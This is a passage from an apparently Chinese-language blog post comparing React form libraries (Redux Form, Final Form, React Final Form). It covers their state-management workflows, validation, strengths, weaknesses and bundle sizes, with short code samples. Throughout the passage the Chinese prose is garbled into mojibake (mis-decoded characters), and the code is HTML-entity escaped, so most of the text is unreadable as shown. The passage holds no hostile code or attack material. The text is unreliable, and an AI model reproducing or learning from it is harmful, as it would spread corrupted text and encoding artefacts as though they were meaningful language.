componentã€ã€‚é€™æ¨£å€¼çš„å„²å­˜èˆ‡æ›´æ–°çš„ç®¡ç†æ–¹å¼ï¼Œå°±æ˜¯è¡¨å–®ç°¡æ˜“çš„ç‹€æ…‹ç®¡ç†çš„ä¾‹å­ï¼Œè¡¨å–®é‚„æœ‰å…¶ä»–ç‹€æ…‹è¦ç®¡ç†ï¼Œä¾‹å¦‚ï¼šè¡¨å–®æ˜¯å¦åˆæ³•ï¼ˆvalidï¼‰ã€å„æ¬„ä½çš„éŒ¯èª¤è¨Šæ¯ï¼ˆvalidationã€errorï¼‰ã€æ¬„ä½å€¼æ˜¯å¦è¢«æ›´æ”¹éï¼ˆdirtyï¼‰ã€åˆå§‹å€¼çš„è¨­å®šï¼ˆinitial valueï¼‰ã€å„ç¨® callback çš„è¨­å®šç­‰ã€‚

ä¹Ÿå› ç‚ºç”±é–‹ç™¼è€…ä¾†ç®¡ç†è¡¨å–®çš„ç‹€æ…‹ï¼Œæ‰€ä»¥æˆ‘å€‘å¯èƒ½éœ€è¦è‡ªå·±åˆ»ä¸€å¥—ç®¡ç†å·¥å…·ï¼Œæˆ–æ˜¯ä½¿ç”¨å¸‚é¢ä¸Šå¤§å¸«å€‘å·²ç¶“å¯¦ä½œå¥½çš„å‡½å¼åº«å°±å¥½äº†ï¼Œä¸ç®¡æ˜¯è‡ªå·²åˆ»é‚„æ˜¯ç”¨åˆ¥äººåˆ»å¥½çš„ï¼Œåœ¨å°ˆæ¡ˆçš„é–‹ç™¼ä¸Šï¼Œéƒ½å¯ä»¥é”åˆ°å…©å€‹æ•ˆæœâ€¦

ä¸ç”¨é‡é€ è¼ªå­ï¼Œç¯€çœé–‹ç™¼æ™‚é–“ï¼Œè‹¥æ¯æ¬¡å¯¦ä½œè¡¨å–®éƒ½è¦é‡åšä¸€æ¬¡è¡¨å–®ç‹€æ…‹ç®¡ç†æ©Ÿåˆ¶å°±å¤ªè¾›è‹¦äº† XD
è‹¥æ˜¯å¤šäººé–‹ç™¼å°ˆæ¡ˆï¼Œå°±èƒ½çµ±ä¸€å½¼æ­¤çš„å¯¦ä½œæ–¹å¼ï¼Œæ¸›å°‘ç¶­è­·çš„é›£åº¦ã€‚

ç•¶ç´…çš„è¡¨å–®å‡½å¼åº«å…ˆä¸è¦è«‡è‡ªå·±åˆ»é€™ä»¶äº‹ï¼Œä¾†çœ‹çœ‹å¤§å¸«å€‘å¹«æˆ‘å€‘åˆ»å¥½çš„è¡¨å–®å‡½å¼åº«æœ‰å“ªäº›â€¦

ç”±ä¸Šåœ–å¯çŸ¥ï¼Œå¯é¸æ“‡çš„è¡¨å–®å‡½å¼åº«çœŸçš„å¾ˆå¤šï¼Œå¤§è‡´ä¸Šå¯åˆ†é¡ç‚ºåŠŸèƒ½å®Œæ•´ã€è¼•é‡æˆ–å…§å»ºé©—è­‰å·¥å…·ç­‰å…±ä¸‰ç¨®ï¼Œå¦å¤–é‚„æœ‰ä¸€äº›æ˜¯é€²å…¥ç¶­è­·ç‹€æ…‹ã€ä¸å†é–‹ç™¼æ–°åŠŸèƒ½çš„ï¼Œå°±ä¸ç´å…¥è©•é¸ã€‚

åŠŸèƒ½å®Œæ•´æ˜¯æŒ‡ API é–‹å¾—å¾ˆå……è¶³çš„å‡½å¼åº«ï¼Œå¯è®“é–‹ç™¼è€…å¯¦ä½œç´°ç·»çš„è¡¨å–®å…ƒä»¶ï¼Œç•¶ç„¶ä¹Ÿèƒ½æ¸›å°‘æ’°å¯«ç¨‹å¼ç¢¼ï¼Œä¾‹å¦‚ï¼šRedux Formï¼ˆåŠŸèƒ½çœŸæ˜¯åŒ…å±±åŒ…æµ·ï¼‰ã€React Final Formã€Formikã€Informedã€‚
å¼·èª¿è¼•é‡äº¦å³æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¾ˆå°ï¼Œé©åˆå°é«”ç©å¤§å°æœ‰é¡§æ…®çš„å°ˆæ¡ˆï¼Œä¾‹å¦‚ï¼šFinal Formã€React Final Formã€Formsy Reactã€‚
å…§å»ºé©—è­‰å·¥å…·çš„å‡½å¼åº«è®“é–‹ç™¼è€…èƒ½å¾ˆæ–¹ä¾¿çš„æ’°å¯«é©—è­‰è¦å‰‡ï¼Œä¾‹å¦‚ï¼šFormikã€Informedã€React Formsã€‚

æ¥ä¸‹ä¾†æˆ‘é¸æ“‡ Redux Formã€React Final Form å’Œ Formik &amp; Yup ä¾†åšè¨è«–ã€‚
å¦‚ä½•é¸æ“‡å¥½çš„è¡¨å–®å‡½ç¤ºåº«ï¼Ÿå…ˆç¶œè§€ä¾†çœ‹æ€éº¼é¸æ“‡å¥½çš„è¡¨å–®å‡½ç¤ºåº«ã€‚ä¸€èˆ¬ä¾†èªªï¼Œé€™äº›å‡½å¼åº«ä¸»è¦éƒ½æ˜¯åšç‹€æ…‹ç®¡ç†ï¼Œè€Œå®ƒå€‘éƒ½åšå¾—å¾ˆå¥½ï¼Œåªæ˜¯æœ‰äº›å·®ç•°ï¼Œå› æ­¤æ­¸ç´äº†ä¸€äº›æŒ‘é¸åŸå‰‡â€¦

é€™å€‹å‡½å¼åº«æ˜¯æ€éº¼åšç‹€æ…‹ç®¡ç†çš„ï¼Ÿæœƒä¸æœƒæœ‰æ•ˆèƒ½å•é¡Œï¼Ÿ
API å……è¶³å—ï¼Ÿèƒ½ç‚ºé–‹ç™¼è€…æ¸›å°‘æ’°å¯«å¤šå°‘ç¨‹å¼ç¢¼ï¼Ÿé€šå¸¸ API å……è¶³çš„å‡½å¼åº«ï¼Œæ‰“åŒ…å¾Œçš„æª”æ¡ˆé«”æ©Ÿæœƒæ¯”è¼ƒå¤§ï¼Œåªèƒ½å–æ¨ä¸€ä¸‹äº†ã€‚
å¦‚ä½•æ’°å¯«é©—è­‰é‚è¼¯ï¼Ÿ
æ“´å……æ€§å¦‚ä½•ï¼Ÿæ˜¯å¦èƒ½è¼•æ˜“æ–°å¢å’Œç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ï¼Ÿ
æ–‡ä»¶æ˜¯å¦è©³ç´°ï¼Ÿç¯„ä¾‹æ˜¯å¦å……è¶³ï¼Ÿä¹‹å¾Œè‹¥é‡åˆ°å•é¡Œæ˜¯å¦èƒ½å¾ˆå¿«è¢«è§£æ±ºï¼Ÿ
æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¤§å°ã€‚
Github æ˜Ÿæ˜Ÿæ•¸ and NPM ä¸‹è¼‰æ•¸ã€‚é€™æ˜¯æ¯”è¼ƒä¸é‡è¦çš„è€ƒé‡é»ï¼Œç•¢ç«Ÿéå»ç«ç´…çš„å°ˆæ¡ˆï¼Œç›®å‰å¯èƒ½å·²ä¸ç¬¦åˆéœ€æ±‚ï¼Œä½†å·²é•·æ™‚é–“ç´¯ç©äº†å¾ˆå¤šçš„æ˜Ÿæ˜Ÿæ•¸å’Œä¸‹è¼‰æ•¸ï¼›è€Œæ–°å‡ºä¾†çš„å°ˆæ¡ˆå¯èƒ½å› èµ·æ­¥è¼ƒæ™šè€Œæ²’æœ‰å¾ˆå¤šçš„æ˜Ÿæ˜Ÿæ•¸å’Œä¸‹è¼‰æ•¸ï¼Œä½†åšå¾—å»éå¸¸å¥½ã€‚
å‡½å¼åº«æä¾›çš„ç‰¹é»æ˜¯å¦èƒ½è§£æ±ºå°ˆæ¡ˆçš„éœ€æ±‚ï¼Ÿ

Redux Form
Redux Form åˆ©ç”¨ Redux ä¾†å„²å­˜æ•´å€‹ app çš„è¡¨å–®ç‹€æ…‹ï¼Œå†æ ¹æ“šç•¶å‰æ‰€éœ€æå–ç‰¹å®šè¡¨å–®è³‡æ–™ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œå…ˆåœ¨ Redux store å»ºç«‹è¡¨å–®çš„ reducerï¼Œç¶“ç”± HOC çš„æ–¹å¼é€£æ¥è¡¨å–®å’Œ storeï¼Œå†ç”± props å¸¶å…¥è³‡æ–™ã€‚
Workflow
åœ–ç‰‡ä¾†æºï¼šRedux Form - Getting Started
Redux Form çš„å·¥ä½œæµç¨‹æ˜¯é€™æ¨£çš„â€¦
ç•¶ä½¿ç”¨è€…å°è¡¨å–®å…ƒä»¶è¼¸å…¥è³‡æ–™æ™‚æœƒç™¼å‡º action å»æ›´æ–° storeï¼Œç•¶ç‹€æ…‹è¢«æ›´æ–°ï¼Œå°±æœƒé‡æ–°æ¸²æŸ“å…ƒä»¶ï¼Œä½¿ç”¨è€…å°±èƒ½çœ‹åˆ°å‰›æ‰è¼¸å…¥çš„è³‡æ–™ã€‚
Demoç¯„ä¾‹ 1é€™æ˜¯ä¸€å€‹ç°¡æ˜“çš„è¡¨å–®ç¯„ä¾‹ï¼Œä¸¦ä¸”ä½¿ç”¨ redux-form-validators ä½œç‚ºé©—è­‰çš„å·¥å…·ã€‚

åœ¨é€™å€‹ç¯„ä¾‹ä¸­æœ‰å…©å€‹æ¬„ä½ Name å’Œ Emailï¼Œåˆå§‹å€¼å°±ä¸æ˜¯åˆæ³•çš„äº†ï¼Œæ‰€ä»¥è‹¥åœ¨æ­¤æ™‚æŒ‰ä¸‹æŒ‰éˆ• Submit æäº¤è¡¨å–®ï¼Œæœƒçœ‹åˆ° Name ä¸‹æ–¹ç´…è‰²çš„éŒ¯èª¤è¨Šæ¯ã€ŒLength must exceed 3 characters.ã€

åœ¨ä¿®æ­£æ¬„ä½å€¼å¾Œï¼Œå°±å¯ä»¥é †åˆ©æäº¤äº†ã€‚

ä¾†çœ‹åŸå§‹ç¢¼ï¼Œå¦‚æœæƒ³å¾—åˆ°ç‰¹å®šè¡¨å–®çš„è³‡è¨Šï¼Œå¿…é ˆå¾ reducer ä¸­ä½¿ç”¨ selector æå–å‡ºä¾†ï¼Œç„¶å¾Œå†ç”¨ props å¸¶é€²è¡¨å–®ï¼Œä¾‹å¦‚ï¼šformDataã€formValues å’Œ formErrorsã€‚formData æœƒå–å¾—ç›®å‰è¡¨å–®æ‰€æœ‰æ¬„ä½çš„ç‹€æ…‹ï¼Œä¾‹å¦‚é€™å€‹æ¬„ä½æ˜¯å¦è¢« touchedã€dirty æˆ–ç›®å‰ focus åœ¨å“ªå€‹æ¬„ä½ç­‰ï¼›formValues å–å¾—ç›®å‰è¡¨å–®å„æ¬„ä½çš„å€¼ï¼›formErrors å–å¾—ç›®å‰è¡¨å–®å„æ¬„ä½çš„éŒ¯èª¤è¨Šæ¯ã€‚
Form = connect((state) =&gt; (&#123;  formMeta: getFormMeta(&#x27;register&#x27;)(state), // get form data by using selectors  formValues: getFormValues(&#x27;register&#x27;)(state),  formErrors: getFormSyncErrors(&#x27;register&#x27;)(state),&#125;))(Form);

åœ¨ selector é€™è£¡è¦è¼¸å…¥å”¯ä¸€çš„è¡¨å–®åç¨±ã€Œregisterã€ï¼Œæˆ‘å¸¸å¸¸ä¸æ˜¯æ‰“éŒ¯å­—å°±æ˜¯è¼¸å…¥é‡è¤‡çš„åç¨±ï¼Œæ„Ÿåˆ°å›°æ“¾å’Œéº»ç…© XD
å¦å¤–ï¼Œåœ¨é€™è£¡æ­é… redux-form-validators ä½œç‚ºé©—è­‰å·¥å…·ï¼Œå®ƒæä¾›ä¸€äº›ç°¡æ˜“çš„ field-level validation é©—è­‰è¦å‰‡ï¼Œä¸¦ä¸”å¯è‡ªè¨‚éŒ¯èª¤è¨Šæ¯ï¼Œä¹Ÿå¯ç¶“ç”± addValidator åŠ å…¥é©—è­‰è¦å‰‡ã€‚
ç°¡æ˜“ä½¿ç”¨æ–¹å¼å¦‚ä¸‹ï¼Œå°‡ name é€™å€‹æ¬„ä½åŠ ä¸Šé©—è­‰è¦å‰‡å¿…å¡«ï¼ˆrequiredï¼‰å’Œå­—æ•¸é™åˆ¶ï¼ˆlengthï¼Œå¿…é ˆè¶…é 4 å€‹å­—ï¼‰ï¼Œä¸¦è‡ªè¨‚å ±éŒ¯è¨Šæ¯ã€‚
Demoï¼ŒåŸå§‹ç¢¼ã€‚
&lt;Field  name=&#x27;name&#x27;  validate=&#123;[    required(&#123; message: &#x27;Required.&#x27; &#125;),    length(&#123; min: 4, message: &#x27;Length must exceed 3 characters.&#x27; &#125;),  ]&#125;/&gt;

ç¯„ä¾‹ 2é€™æ˜¯ä¸€å€‹æ··åˆåŒæ­¥å’ŒéåŒæ­¥é©—è­‰çš„ç¯„ä¾‹ï¼ŒåŒæ­¥é©—è­‰åƒæ˜¯åç¨±æ˜¯å¦å¿…å¡«ã€å­—æ•¸é™åˆ¶è‡³å°‘ 4 å€‹å­—ï¼Œemail æ˜¯å¦åˆæ³•ï¼›éåŒæ­¥é©—è­‰åƒæ˜¯è©¢å•ä½¿ç”¨è€…çš„åç¨±æ˜¯å¦å·²è¢«ä½¿ç”¨ï¼Œè¼¸å…¥ã€Œpaulã€è¡¨ç¤ºå·²è¢«åˆ¥äººä½¿ç”¨äº†ï¼Œé€™æ˜¯æ¨¡æ“¬å¾ä¼ºæœå™¨ç«¯å›å‚³é©—è­‰çµæœï¼Œå†é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯çš„ç¯„ä¾‹ã€‚

Demoï¼ŒåŸå§‹ç¢¼ï¼Œå…¶ä»–ç¯„ä¾‹é‚„æœ‰å»ºç«‹å‹•æ…‹æ¬„ä½ã€‚
å„ªé»
æä¾›å……è¶³çš„ API èƒ½å¯¦ä½œç´°ç·»çš„å…ƒä»¶ã€‚
å¯æ··åˆåŒæ­¥èˆ‡éåŒæ­¥é©—è­‰ã€‚
ç”±æ–¼ Redux Form æœ¬èº«ä¸¦æ²’æœ‰æä¾›é©—è­‰å·¥å…·ï¼Œä½†å¯è‡ªè¡Œå¯¦ä½œé©—è­‰çš„éƒ¨ä»½æˆ–æ­é…ä»–äººå¯«å¥½çš„å·¥å…·ï¼Œä¾‹å¦‚ï¼šredux-form-validators æˆ– redux-form-yupï¼Œç›¸å°æ˜¯å¾ˆæœ‰å½ˆæ€§çš„ã€‚

ç¼ºé»
è¡¨å–®ç‹€æ…‹ä¸éœ€è¦å­˜åœ¨å…¨åŸŸçš„ store è£¡é¢ï¼Œç•¢ç«Ÿè¡¨å–®ç‹€æ…‹èˆ‡å…¶ä»–åŸä»¶ç„¡é—œã€‚
æ¯ç•¶è¡¨å–®æ›´æ–°ç‹€æ…‹å°±æœƒæ›´æ–° storeï¼Œäº¦å³ä½¿ç”¨è€…æ¯æ‰“ä¸€å€‹å­—éƒ½æœƒåšæ›´æ–°ï¼Œæ•´å€‹è¡¨å–®å°±æœƒé‡æ–°æ¸²æŸ“ï¼Œé€ æˆä¸éœ€è¦æ›´æ–°çš„æ¬„ä½ä¹Ÿè¢«é‡æ–°æ¸²æŸ“ï¼Œå½±éŸ¿æ•ˆèƒ½ï¼ˆå‚™è¨»ï¼‰ï¼Œé€™åœ¨è¡¨å–®å¾ˆå¤§çš„æ™‚å€™ï¼Œå»¶é²ç‹€æ³å°¤å…¶æ˜é¡¯ã€‚ä¹‹å¾Œæˆ‘å€‘æœƒçœ‹åˆ°å…©å€‹æ•ˆèƒ½è¼ƒä½³çš„è¡¨å–®å‡½å¼åº«-React Final Form å’Œ Formikã€‚React Final Form æœ‰è¨‚é–±è¡¨å–®å’Œæ¬„ä½ç‹€æ…‹çš„æ©Ÿåˆ¶ï¼›è€Œ Formik æœ‰ Fastfield å…ƒä»¶ï¼Œåˆ©ç”¨å¯¦ä½œ shouldComponentUpdate çš„æ©Ÿåˆ¶æ±ºå®šè¦ä¸è¦é‡æ–°æ¸²æŸ“è©²æ¬„ä½ï¼Œéƒ½èƒ½æœ‰æ•ˆé™åˆ¶æ¸²æŸ“çš„æ¬¡æ•¸ã€‚
å¿…é ˆä½¿ç”¨ Reduxã€‚è‹¥ app å¾ˆå°ï¼Œä¸éœ€ä½¿ç”¨ Redux åšç‹€æ…‹ç®¡ç†ï¼Œå»å¿…é ˆå› ç‚ºè¡¨å–®è€Œä½¿ç”¨ Redux æ‰èƒ½ç”¨ Redux Formï¼›åˆæˆ–è€…æ˜¯ app ä¸¦éä½¿ç”¨ Redux åšç‹€æ…‹ç®¡ç†å°±ä¸èƒ½ä½¿ç”¨ Redux Formã€‚
å£“ç¸®å¾Œçš„æ‰“åŒ…å¤§å°è¼ƒå¤§ï¼Œè¶…é 26.7KBã€‚React Final Form + Final Form æ˜¯ 7.7KBï¼Œè€Œ Formik æ˜¯ 12KBã€‚
éåŒæ­¥é©—è­‰åªæ”¯æ´ form-level çš„é©—è­‰ï¼Œåœ¨å¯¦ä½œä¸Šä¾†èªªï¼Œè‹¥èƒ½åœ¨æ¬„ä½è¨­å®šé©—è­‰è¦å‰‡æ˜¯æ¯”è¼ƒç›´è¦ºå’Œæ–¹ä¾¿çš„ã€‚
æ–‡ä»¶å’Œç¯„ä¾‹ä¸å¤ å……è¶³ã€ä¸å¤ è©³ç´°ã€‚
ç¼ºå°‘æ“´å……æ€§ã€‚

é—œæ–¼ä»¥ä¸Šçš„ç¼ºé»ï¼Œä¸ç®¡æ˜¯è¡¨å–®ç‹€æ…‹çš„å„²å­˜ã€æ‰“åŒ…å¤§å°ã€æ–‡ä»¶èˆ‡ç¯„ä¾‹ã€æ“´å……æ€§ç­‰ï¼Œæ¥ä¸‹ä¾†æˆ‘å€‘æœƒçœ‹åˆ°å…©å€‹åšå¾—æ›´å¥½çš„å‡½å¼åº«-React Final Form å’Œ Formikã€‚
å‚™è¨»ï¼šæ¸›å°‘ä¸å¿…è¦çš„æ¸²æŸ“æ˜¯æŒ‡åœ¨ React åš virtaul dom çš„æ¯”å°è€Œæ±ºå®šæ˜¯å¦è¦æ¸²æŸ“å‰ï¼Œå¯åˆ©ç”¨å…ƒä»¶å¯¦ä½œçš„æ©Ÿåˆ¶è€Œçœä¸‹é€™è¤‡é›œè¨ˆç®—éç¨‹ï¼Œå› æ­¤èƒ½æ¸›å°‘å»¶é²æ•ˆæœã€‚
Final Form
åœ¨çœ‹ React Final Form ä¹‹å‰ï¼Œå…ˆä¾†çœ‹å®ƒçš„ç‹€æ…‹ç®¡ç†å¼•æ“ Final Formã€‚ç”±æ–¼ Final Form æ˜¯è¡¨å–®ç‹€æ…‹ç®¡ç†çš„å¼•æ“ï¼Œå› æ­¤èˆ‡æ¡†æ¶ç„¡é—œï¼Œä¸¦ä¸”å¯ä»¥ç¨ç«‹ä½¿ç”¨æˆ–å¯¦ä½œ React æˆ– Vue çš„ wrapper åŒ…è£å¾Œä¾†ä½¿ç”¨å®ƒã€‚
Final Form çš„ç‰¹é»å¦‚ä¸‹

ç”±æ–¼æ˜¯ç‹€æ…‹ç®¡ç†å¼•æ“ï¼Œå› æ­¤èˆ‡æ¡†æ¶ç„¡é—œï¼Œå¯ä»¥ç¨ç«‹ä½¿ç”¨æˆ–å¯¦ä½œ React æˆ– Vue çš„ wrapper åŒ…è£å¾Œä¾†ä½¿ç”¨å®ƒã€‚
Final Form åˆ©ç”¨è¨‚é–±çš„æ©Ÿåˆ¶ä¾†é¸æ“‡è¦è¿½è¹¤çš„ç‹€æ…‹ï¼Œè‹¥è¿½è¹¤çš„ç‹€æ…‹æœ‰æ›´æ–°å†é€šçŸ¥æ›´æ–°å…ƒä»¶ã€‚
è¡¨å–®çš„ç‹€æ…‹æ˜¯å­˜åœ¨ Final Form çš„ form instance çš„ stateï¼Œä¸åƒ Redux Form æ˜¯å­˜åœ¨å…¨åŸŸçš„ store è£¡é¢ï¼Œå› æ­¤èˆ‡ä»»ä½•é¡ä¼¼ flux ç‹€æ…‹ç®¡ç†å·¥å…·å®Œå…¨ç„¡ç›¸ä¾é—œä¿‚ã€‚
æ“´å……æ€§é«˜ï¼Œå¯åˆ©ç”¨ decorator çš„æ–¹å¼è¼•æ˜“çš„æ–°å¢æˆ–ç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ã€‚
æ²’æœ‰å’Œå…¶ä»–å‡½å¼åº«ç›¸ä¾ã€‚
æ‰“åŒ…å¾Œçš„æª”æ¡ˆå¾ˆå°ï¼Œå£“ç¸®å¾Œåªæœ‰ 4.7KBã€‚

Demoç¯„ä¾‹ 1é€™æ˜¯ä¸€å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œç¤ºç¯„å¦‚ä½•ä½¿ç”¨ Final Formã€‚
å¦‚ä¸‹åœ–æ‰€ç¤ºï¼ŒåŒæ¨£ä¹Ÿæ˜¯å¡«å¯« Name å’Œ Email çš„ç°¡æ˜“è¡¨å–®ï¼Œç”±æ–¼ Name å¿…é ˆè¶…é 3 å€‹å­—ï¼Œå› æ­¤æäº¤æŒ‰éˆ•æ˜¯ disabled ç‹€æ…‹ï¼Œç„¡æ³•é€å‡ºã€‚

blur æ¬„ä½ Name å¾Œå¯çœ‹åˆ°éŒ¯èª¤è¨Šæ¯ã€‚

ä¿®æ­£æ¬„ä½å¾Œï¼Œæäº¤æŒ‰éˆ•è®Šæˆ enabled ç‹€æ…‹ï¼Œå³å¯é€å‡ºã€‚

å¾å¯¦éš›ç¨‹å¼ç¢¼ä¾†çœ‹ Final Form çš„ä½¿ç”¨æ–¹å¼ã€‚
åˆ©ç”¨ createForm å»ºç«‹è¡¨å–®ï¼Œä¸¦æŒ‡å®šä¸‰å€‹åƒæ•¸ initialValuesã€onSubmitã€validateï¼Œåˆ†åˆ¥æ˜¯è¡¨å–®çš„åˆå§‹å€¼ã€æäº¤æ™‚å‘¼å«çš„ callback å’Œé©—è­‰è¦å‰‡ï¼Œå…¶ä¸­ onSubmit å¿…å¡«ã€‚
import &#123; createForm &#125; from &#x27;final-form&#x27;;const form = createForm(&#123; initialValues, onSubmit, validate &#125;);

è¨‚é–±è¡¨å–®è¦ç›£è½çš„å±¬æ€§ï¼Œä¾‹å¦‚ï¼šè¡¨å–®æ˜¯å¦åˆæ³•ï¼ˆvalidï¼‰ã€ç›®å‰åœ¨å“ªå€‹æ¬„ä½ï¼ˆactiveï¼‰ã€ç›®å‰è¡¨å–®æ‰€æœ‰æ¬„ä½çš„å€¼ï¼ˆvaluesï¼‰ã€å“ªäº›æ¬„ä½å·²è¢«ä¿®æ”¹éï¼ˆdirtyï¼‰ã€‚
// Subscribe to form state updatesconst unsubscribe = form.subscribe(  formState =&gt; &#123;    // Update UI  &#125;,  &#123; // FormSubscription: the list of values you want to be updated about    active: true,    dirty: true,    valid: true,    values: true  &#125;&#125;)

è¨‚é–±æ¬„ä½è¦ç›£è½çš„å±¬æ€§ï¼Œä¾‹å¦‚ï¼šéŒ¯èª¤è¨Šæ¯ï¼ˆerrorï¼‰ã€æ˜¯å¦è¢«è§¸ç¢°ï¼ˆtouchedï¼‰ã€ç›®å‰çš„å€¼ï¼ˆvalueï¼‰ç­‰ã€‚
// Subscribe to field state updatesconst unregisterField = form.registerField(  &#x27;name&#x27;,  (fieldState) =&gt; &#123;    // Update field UI    const &#123; blur, change, focus, ...rest &#125; = fieldState;    // In addition to the values you subscribe to, field state also includes functions that your inputs need to update their state.  &#125;,  &#123;    // FieldSubscription: the list of values you want to be updated about    error: true,    touched: true,    value: true,  &#125;,);

Demoï¼ŒåŸå§‹ç¢¼ã€‚
ç¯„ä¾‹ 2ï¼šReact wrapper for Final Formç°¡å–®å¯¦ä½œ React wrapper ä¾†ä½¿ç”¨ Final Formã€‚åŒæ¨£ä¹Ÿæ˜¯å¡«å¯« Name å’Œ Email çš„ç°¡æ˜“è¡¨å–®ï¼Œç”±æ–¼ Name å¿…é ˆè¶…é 3 å€‹å­—ï¼Œå› æ­¤æäº¤æŒ‰éˆ•æ˜¯ disabled ç‹€æ…‹ï¼Œç„¡æ³•é€å‡ºã€‚

ç¨‹å¼ç¢¼ç¯„ä¾‹å¦‚ä¸‹ï¼Œé€™è£¡ç”¨ä¸€å€‹ Form wapper æŠŠ Final Form åŒ…èµ·ä¾†ï¼Œé–‹ç™¼è€…åªè¦ä¾èˆŠæŒ‡å®š initialValuesã€onSubmitã€validateï¼Œä¸¦ä¸”è¨­å®šæ¬„ä½è¦é¡¯ç¤ºçš„åç¨±å’Œå±¬æ€§ nameã€‚è¡¨å–®æŒ‡å®šè¦ç›£è½å››å€‹å±¬æ€§ validã€pristineã€submittingã€valuesï¼Œæ¬„ä½å‰‡æ˜¯æ²’æœ‰æŒ‡å®šå°±æ˜¯ç›£è½å…¨éƒ¨å±¬æ€§ã€‚
&lt;Form // (1) create form  initialValues=&#123;&#123;    name: &#x27;Ann&#x27;,    email: &#x27;sample@test.com&#x27;,  &#125;&#125;  onSubmit=&#123;(values) =&gt; &#123;    alert(JSON.stringify(values, 0, 2));  &#125;&#125;  validate=&#123;validate&#125;  // (2) subscribe form state  subscription=&#123;[&#x27;valid&#x27;, &#x27;pristine&#x27;, &#x27;submitting&#x27;, &#x27;values&#x27;]&#125;&gt;  &#123;/* (3) subscribe all field state */&#125;  &lt;Form.Field label=&#x27;Name&#x27; name=&#x27;name&#x27; /&gt;  &lt;Form.Field label=&#x27;Email&#x27; name=&#x27;email&#x27; /&gt;&lt;/Form&gt;

Demoï¼ŒåŸå§‹ç¢¼ã€‚
React Final Form

React Final Form å°‡ Final Form åŒ…è£èµ·ä¾†ï¼Œé€™æ¨£å°±èƒ½åœ¨ React çš„ç’°å¢ƒä¸­ä½¿ç”¨ã€‚ä¹Ÿå°±æ˜¯èªªï¼Œç”± Final Form ä¿å­˜ç‹€æ…‹ï¼ŒReact Final Form åªæ˜¯ä¸€å±¤ wrapperã€‚
ç”±å‰›å‰›æåˆ°çš„ Final Form å¯çŸ¥ï¼ŒFinal Form åªæä¾›è¨‚é–±çš„ç‹€æ…‹ï¼Œé€™æ˜¯å› ç‚ºä½¿ç”¨è€…æ¯å€‹è¼¸å…¥æˆ–ä»»ä½•å‹•ä½œéƒ½æœƒé€ æˆé‡æ–°æ¸²æŸ“ï¼Œæ”¹å–„æ–¹å¼æ˜¯è¡¨å–®å¯è¨‚é–±æƒ³è¦è¢«é€šçŸ¥çš„ç‹€æ…‹ï¼Œç•¶è¢«è¨‚é–±çš„ç‹€æ…‹æœ‰æ›´æ–°æ™‚æ‰åšé€šçŸ¥ã€‚æ³¨æ„ï¼Œå¦‚æœä¸æŒ‡å®šè¨‚é–±çš„ç‹€æ…‹å°±æ˜¯è¨‚é–±å…¨éƒ¨çš„ç‹€æ…‹ï¼Œä¹Ÿç„¡æ³•å•Ÿå‹•æ¬„ä½çš„ç‹€æ…‹è¨‚é–±äº†ã€‚
éå¸¸è¼•é‡ï¼Œå£“ç¸®å¾Œçš„æ‰“åŒ…æª”æ¡ˆåªæœ‰ 3KBã€‚

Workflow
èªªæ˜

React Final Form çš„å·¥ä½œæµç¨‹å¦‚é€™å¼µåœ–æ‰€ç¤ºï¼ŒReact Final Form å°‡è¡¨å–®çš„ç‹€æ…‹å­˜åœ¨ React Final Form çš„ form instance è£¡é¢ã€‚
ç•¶ä½¿ç”¨è€…å°æŸå€‹ input æ‰“å­—ï¼Œé€™æ™‚å€™å°±æœƒå»æ›´æ–°è¡¨å–®çš„ä¸­æœ‰è¨‚é–±çš„ç‹€æ…‹ã€‚
æ¥è‘—ï¼Œç”±æ–¼ç‹€æ…‹è¢«ä¿®æ”¹ï¼Œå› æ­¤é‡æ–°æ¸²æŸ“æœ‰è¨‚é–±ä¸”æ›´æ–°ç‹€æ…‹çš„æ¬„ä½ï¼Œä½¿ç”¨è€…å°±èƒ½çœ‹åˆ°å‰›æ‰è¼¸å…¥çš„å€¼å’Œæ›´æ–°å¾Œçš„è¡¨å–®ç‹€æ…‹ã€‚

Demoç¯„ä¾‹ 1ï¼šDecoratorsReact Final Form çš„æ“´å……æ€§é«˜ï¼Œå¯åˆ©ç”¨ decorator çš„æ–¹å¼è¼•æ˜“çš„æ–°å¢æˆ–ç§»é™¤åŠŸèƒ½ä»¥ç¬¦åˆæœªä¾†çš„éœ€æ±‚ï¼Œä¸¦ä¸”ä¹Ÿèƒ½ä¿æŒ React Final Form çš„é«”ç©å¾ˆå°ã€‚
ä¾‹å¦‚ï¼Œæˆ‘å€‘å¸Œæœ›åœ¨æäº¤è¡¨å–®å¾Œï¼Œèƒ½ foucs åœ¨ç¬¬ä¸€å€‹æœ‰éŒ¯çš„æ¬„ä½ä¸Šï¼Œé‚£å°±å¯ä»¥è£ä¸Š final-form-focus é€™å€‹ decorator å”åŠ©é”æˆã€‚
å¦‚ä¸‹åœ–æ‰€ç¤ºï¼Œè¡¨å–®çš„å…©å€‹æ¬„ä½ Name èˆ‡ Password çš†ç‚ºå¿…å¡«ä½†æœªå¡«ï¼Œå› æ­¤æŒ‰ä¸‹æäº¤æŒ‰éˆ•å¾Œï¼Œéƒ½é¡¯ç¤ºéŒ¯èª¤è¨Šæ¯ï¼Œä¸¦å› ç‚ºè£äº† final-form-focus è€Œèƒ½å°‡æ¸¸æ¨™åœåœ¨ç¬¬ä¸€å€‹æ¬„ä½ï¼Œä¹Ÿå°±æ˜¯æ¬„ä½ Name ç•¶ä¸­ã€‚

Demoï¼ŒåŸå§‹ç¢¼ã€‚
ç¯„ä¾‹ 2ï¼šåˆ©ç”¨è¨‚é–±æ©Ÿåˆ¶æ”¹å–„æ•ˆèƒ½å•é¡Œä¸€é–‹å§‹é€™å€‹è¡¨å–®çš„æ¬„ä½å…¨éƒ¨éƒ½æ²’æœ‰é€šéé©—è­‰è¦å‰‡ï¼Œä¾‹å¦‚ï¼šname ç‚ºå¿…å¡«ä½†æ˜¯ç›®å‰æ²’æœ‰å€¼ï¼Œemail ä¸åˆè¦å‰‡ï¼Œæ­¤æ™‚è¡¨å–®è¨‚é–±çš„ç‹€æ…‹ä¸­ valid å€¼ç‚º falseã€‚

